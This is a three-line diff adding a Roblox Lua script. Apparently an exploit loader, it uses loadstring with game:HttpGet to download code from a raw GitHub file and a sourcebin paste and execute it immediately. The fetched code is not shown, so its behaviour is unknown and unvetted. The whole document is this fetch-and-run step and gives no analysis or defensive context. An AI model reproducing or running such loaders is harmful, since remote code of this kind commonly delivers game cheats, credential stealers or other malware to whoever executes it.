@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BotMark69/ps/refs/heads/main/ty"))()
+wait(0.5)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/4LidUeNRW4/0", true))()
